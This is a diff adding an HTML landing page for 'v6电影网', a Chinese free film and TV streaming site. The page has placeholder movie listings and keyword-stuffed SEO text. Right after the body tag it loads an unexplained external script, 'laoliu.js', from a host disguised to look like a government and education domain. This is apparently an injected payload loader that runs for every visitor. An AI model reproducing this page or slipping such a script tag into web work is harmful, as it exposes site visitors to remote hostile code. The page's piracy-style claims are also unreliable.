@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>v6电影网 - 免费高清电影在线观看 | v6dianyingwang-h5</title>
+<meta name="description" content="v6电影网（v6dianyingwang-h5）提供最新高清电影、电视剧、综艺、动漫在线观看，免费播放，每日更新，畅享极致观影体验。">
+<meta name="keywords" content="v6电影网, v6dianyingwang-h5, 免费电影, 高清电影, 在线观看, 最新电影">
+<meta name="author" content="v6电影网">
+<meta name="robots" content="index,follow">
+<!-- 必应站长验证预留位置 -->
+<!-- <meta name="msvalidate.01" content="你的必应验证代码" /> -->
+
+<style>
+/* ===== 全局重置与基础样式 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+    background-color: #0a0a0a;
+    color: #e0e0e0;
+    line-height: 1.6;
+}
+
+a {
+    text-decoration: none;
+    color: #ff6b6b;
+    transition: color 0.3s ease;
+}
+
+a:hover {
+    color: #ffa502;
+}
+
+/* ===== 头部导航 ===== */
+.header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    padding: 1rem 0;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 1rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+.logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #ff6b6b;
+    text-shadow: 0 0 10px rgba(255,107,107,0.3);
+}
+
+.nav-menu {
+    display: flex;
+    gap: 1.5rem;
+    list-style: none;
+}
+
+.nav-menu a {
+    color: #e0e0e0;
+    font-size: 0.95rem;
+    padding: 0.5rem 0;
+    border-bottom: 2px solid transparent;
+}
+
+.nav-menu a:hover {
+    color: #ff6b6b;
+    border-bottom-color: #ff6b6b;
+}
+
+/* ===== 英雄横幅 ===== */
+.hero {
+    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), 
+                url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><rect fill="%2316233e" width="1200" height="600"/><circle cx="300" cy="150" r="100" fill="%23ff6b6b" opacity="0.1"/><circle cx="900" cy="450" r="150" fill="%23ffa502" opacity="0.1"/></svg>');
+    background-size: cover;
+    background-position: center;
+    padding: 4rem 1rem;
+    text-align: center;
+}
+
+.hero h1 {
+    font-size: 2rem;
+    margin-bottom: 1rem;
+    color: #fff;
+}
+
+.hero p {
+    font-size: 1rem;
+    max-width: 600px;
+    margin: 0 auto 2rem;
+    color: #b0b0b0;
+}
+
+.cta-button {
+    display: inline-block;
+    background: linear-gradient(45deg, #ff6b6b, #ffa502);
+    color: #fff;
+    padding: 0.8rem 2rem;
+    border-radius: 50px;
+    font-weight: 600;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.cta-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 20px rgba(255,107,107,0.4);
+    color: #fff;
+}
+
+/* ===== 栏目通用样式 ===== */
+.section {
+    padding: 3rem 1rem;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+.section-title {
+    text-align: center;
+    font-size: 1.8rem;
+    margin-bottom: 2rem;
+    color: #fff;
+    position: relative;
+}
+
+.section-title::after {
+    content: '';
+    display: block;
+    width: 60px;
+    height: 3px;
+    background: linear-gradient(45deg, #ff6b6b, #ffa502);
+    margin: 0.5rem auto 0;
+    border-radius: 2px;
+}
+
+/* ===== 电影卡片网格 ===== */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 1.5rem;
+}
+
+.movie-card {
+    background: #16213e;
+    border-radius: 10px;
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    cursor: pointer;
+}
+
+.movie-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+}
+
+.movie-poster {
+    width: 100%;
+    height: 220px;
+    background: linear-gradient(45deg, #1a1a2e, #0f3460);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 3rem;
+}
+
+.movie-info {
+    padding: 1rem;
+}
+
+.movie-title {
+    font-size: 0.9rem;
+    font-weight: 600;
+    margin-bottom: 0.5rem;
+    color: #fff;
+}
+
+.movie-meta {
+    font-size: 0.8rem;
+    color: #888;
+}
+
+/* ===== 分类标签 ===== */
+.category-tags {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 0.8rem;
+    margin-bottom: 2rem;
+}
+
+.tag {
+    background: #16213e;
+    padding: 0.5rem 1.2rem;
+    border-radius: 25px;
+    font-size: 0.85rem;
+    color: #b0b0b0;
+    border: 1px solid #2a3a5c;
+    transition: all 0.3s ease;
+}
+
+.tag:hover {
+    background: #ff6b6b;
+    color: #fff;
+    border-color: #ff6b6b;
+}
+
+/* ===== 关于我们 ===== */
+.about-content {
+    background: #16213e;
+    padding: 2rem;
+    border-radius: 15px;
+    border: 1px solid #2a3a5c;
+}
+
+.about-content h3 {
+    color: #ff6b6b;
+    margin-bottom: 1rem;
+}
+
+.about-content p {
+    margin-bottom: 1rem;
+    color: #b0b0b0;
+}
+
+/* ===== 底部 ===== */
+.footer {
+    background: #0f0f1a;
+    padding: 2rem 1rem;
+    text-align: center;
+    border-top: 1px solid #1a1a2e;
+}
+
+.footer p {
+    color: #666;
+    font-size: 0.85rem;
+    margin-bottom: 0.5rem;
+}
+
+.footer a {
+    color: #888;
+}
+
+.footer a:hover {
+    color: #ff6b6b;
+}
+
+/* ===== 移动端自适应 ===== */
+@media (max-width: 768px) {
+    .nav-container {
+        flex-direction: column;
+        gap: 1rem;
+    }
+    
+    .nav-menu {
+        gap: 1rem;
+        flex-wrap: wrap;
+        justify-content: center;
+    }
+    
+    .hero h1 {
+        font-size: 1.5rem;
+    }
+    
+    .hero p {
+        font-size: 0.9rem;
+    }
+    
+    .section {
+        padding: 2rem 1rem;
+    }
+    
+    .section-title {
+        font-size: 1.5rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+        gap: 1rem;
+    }
+    
+    .movie-poster {
+        height: 180px;
+        font-size: 2rem;
+    }
+    
+    .about-content {
+        padding: 1.5rem;
+    }
+}
+
+@media (max-width: 480px) {
+    .hero {
+        padding: 3rem 1rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+    
+    .category-tags {
+        gap: 0.5rem;
+    }
+    
+    .tag {
+        padding: 0.4rem 0.8rem;
+        font-size: 0.8rem;
+    }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- ===== 头部导航 ===== -->
+<header class="header">
+    <div class="nav-container">
+        <div class="logo">🎬 v6电影网</div>
+        <nav>
+            <ul class="nav-menu">
+                <li><a href="#home">首页</a></li>
+                <li><a href="#movies">电影</a></li>
+                <li><a href="#tv">电视剧</a></li>
+                <li><a href="#variety">综艺</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<!-- ===== 首页横幅 ===== -->
+<section class="hero" id="home">
+    <h1>v6电影网 - 免费高清电影在线观看</h1>
+    <p>v6dianyingwang-h5 为您提供最新、最热的电影、电视剧、综艺、动漫资源，每日更新，畅享极致观影体验。</p>
+    <a href="#movies" class="cta-button">立即观看</a>
+</section>
+
+<!-- ===== 电影栏目 ===== -->
+<section class="section" id="movies">
+    <h2 class="section-title">🎬 热门电影</h2>
+    
+    <div class="category-tags">
+        <span class="tag">动作片</span>
+        <span class="tag">喜剧片</span>
+        <span class="tag">爱情片</span>
+        <span class="tag">科幻片</span>
+        <span class="tag">恐怖片</span>
+        <span class="tag">纪录片</span>
+    </div>
+    
+    <div class="movie-grid">
+        <div class="movie-card">
+            <div class="movie-poster">🎥</div>
+            <div class="movie-info">
+                <div class="movie-title">沙丘2</div>
+                <div class="movie-meta">2024 · 科幻/冒险</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎥</div>
+            <div class="movie-info">
+                <div class="movie-title">奥本海默</div>
+                <div class="movie-meta">2023 · 传记/历史</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎥</div>
+            <div class="movie-info">
+                <div class="movie-title">蜘蛛侠：纵横宇宙</div>
+                <div class="movie-meta">2023 · 动画/动作</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎥</div>
+            <div class="movie-info">
+                <div class="movie-title">流浪地球2</div>
+                <div class="movie-meta">2023 · 科幻/灾难</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎥</div>
+            <div class="movie-info">
+                <div class="movie-title">满江红</div>
+                <div class="movie-meta">2023 · 悬疑/喜剧</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎥</div>
+            <div class="movie-info">
+                <div class="movie-title">封神第一部</div>
+                <div class="movie-meta">2023 · 奇幻/动作</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 电视剧栏目 ===== -->
+<section class="section" id="tv" style="background:#0f0f1a;">
+    <h2 class="section-title">📺 热播电视剧</h2>
+    
+    <div class="category-tags">
+        <span class="tag">国产剧</span>
+        <span class="tag">美剧</span>
+        <span class="tag">韩剧</span>
+        <span class="tag">日剧</span>
+        <span class="tag">英剧</span>
+    </div>
+    
+    <div class="movie-grid">
+        <div class="movie-card">
+            <div class="movie-poster">📺</div>
+            <div class="movie-info">
+                <div class="movie-title">繁花</div>
+                <div class="movie-meta">2023 · 剧情/爱情</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">📺</div>
+            <div class="movie-info">
+                <div class="movie-title">狂飙</div>
+                <div class="movie-meta">2023 · 犯罪/剧情</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">📺</div>
+            <div class="movie-info">
+                <div class="movie-title">权力的游戏</div>
+                <div class="movie-meta">2011 · 奇幻/冒险</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">📺</div>
+            <div class="movie-info">
+                <div class="movie-title">黑暗荣耀</div>
+                <div class="movie-meta">2022 · 剧情/复仇</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">📺</div>
+            <div class="movie-info">
+                <div class="movie-title">庆余年第二季</div>
+                <div class="movie-meta">2024 · 古装/剧情</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">📺</div>
+            <div class="movie-info">
+                <div class="movie-title">三体</div>
+                <div class="movie-meta">2023 · 科幻/剧情</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 综艺栏目 ===== -->
+<section class="section" id="variety">
+    <h2 class="section-title">🎤 热门综艺</h2>
+    
+    <div class="category-tags">
+        <span class="tag">真人秀</span>
+        <span class="tag">脱口秀</span>
+        <span class="tag">音乐</span>
+        <span class="tag">选秀</span>
+        <span class="tag">访谈</span>
+    </div>
+    
+    <div class="movie-grid">
+        <div class="movie-card">
+            <div class="movie-poster">🎤</div>
+            <div class="movie-info">
+                <div class="movie-title">奔跑吧</div>
+                <div class="movie-meta">2024 · 真人秀</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎤</div>
+            <div class="movie-info">
+                <div class="movie-title">歌手2024</div>
+                <div class="movie-meta">2024 · 音乐竞演</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎤</div>
+            <div class="movie-info">
+                <div class="movie-title">极限挑战</div>
+                <div class="movie-meta">2024 · 真人秀</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎤</div>
+            <div class="movie-info">
+                <div class="movie-title">向往的生活</div>
+                <div class="movie-meta">2023 · 生活纪实</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎤</div>
+            <div class="movie-info">
+                <div class="movie-title">脱口秀大会</div>
+                <div class="movie-meta">2023 · 喜剧脱口秀</div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">🎤</div>
+            <div class="movie-info">
+                <div class="movie-title">中国好声音</div>
+                <div class="movie-meta">2023 · 音乐选秀</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 关于我们 ===== -->
+<section class="section" id="about" style="background:#0f0f1a;">
+    <h2 class="section-title">ℹ️ 关于 v6电影网</h2>
+    
+    <div class="about-content">
+        <h3>🎬 网站简介</h3>
+        <p><strong>v6电影网</strong>（网址：<a href="https://v6dianyingwang-h5" target="_blank" rel="noopener">https://v6dianyingwang-h5</a>）是一个专注于提供高清电影、电视剧、综艺、动漫在线观看的影视平台。我们致力于为用户打造一个免费、便捷、高质量的观影体验。</p>
+        
+        <h3>🌟 我们的优势</h3>
+        <p>✅ <strong>资源丰富</strong>：涵盖国内外最新电影、电视剧、综艺、动漫等全品类影视内容。</p>
+        <p>✅ <strong>高清画质</strong>：提供1080P、4K等多种清晰度选择，享受影院级体验。</p>
+        <p>✅ <strong>每日更新</strong>：紧跟影视热点，第一时间更新最新资源。</p>
+        <p>✅ <strong>免费观看</strong>：无需注册，无需付费，随时随地畅享观影乐趣。</p>
+        
+        <h3>📞 联系我们</h3>
+        <p>如果您有任何问题或建议，欢迎通过网站反馈渠道与我们联系。v6电影网（v6dianyingwang-h5）期待为您服务！</p>
+    </div>
+</section>
+
+<!-- ===== 底部 ===== -->
+<footer class="footer">
+    <p>© 2024 <strong>v6电影网</strong> (v6dianyingwang-h5) - 免费高清电影在线观看平台</p>
+    <p>网址：<a href="https://v6dianyingwang-h5" target="_blank" rel="noopener">https://v6dianyingwang-h5</a></p>
+    <p>关键词：v6电影网, v6dianyingwang-h5, 免费电影, 高清电影, 在线观看</p>
+    <p style="margin-top:1rem; font-size:0.75rem; color:#555;">
+        免责声明：本站仅提供影视信息导航服务，所有资源来自互联网，如有侵权请联系删除。
+    </p>
+</footer>
+
+</body>
+</html>
